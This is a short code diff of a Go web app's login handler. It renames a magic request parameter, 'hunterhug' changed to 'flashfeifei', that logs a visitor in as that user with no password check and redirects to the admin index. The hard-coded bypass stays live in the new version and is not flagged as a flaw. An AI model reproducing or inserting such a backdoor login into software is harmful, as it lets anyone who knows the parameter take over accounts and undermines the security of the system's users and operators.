@@ -104,9 +104,9 @@ func (this *MainController) Login() {
 
 	//登陆中，这种方式有点问题，容易与Ajax方式混乱，建议保持统一
 	isajax := this.GetString("isajax")
-	preajax := this.GetString("hunterhug")
-	if preajax == "hunterhug" {
-		this.SetSession("userinfo", admin.User{Username: "hunterhug"})
+	preajax := this.GetString("flashfeifei")
+	if preajax == "flashfeifei" {
+		this.SetSession("userinfo", admin.User{Username: "flashfeifei"})
 		this.Ctx.Redirect(302, "/public/index")
 		return
 	}
